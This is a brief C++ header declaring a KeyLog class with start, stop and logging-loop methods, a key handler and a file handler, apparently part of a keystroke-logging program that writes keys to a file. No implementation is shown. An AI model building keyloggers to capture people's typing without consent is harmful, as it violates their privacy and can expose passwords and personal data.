//
// Created by actua on 5/21/2024.
//

#ifndef KEYLOG_H
#define KEYLOG_H

#include "Key.h"
#include "FileHandler.h"

#include <string>


class KeyLog {
public:
  explicit KeyLog(const std::string &fname);
  void start();
  void stop();
  void logLoop();

private:
  Key keyHandler;
  bool running;
  FileHandler fileHandler;
};


#endif //KEYLOG_H
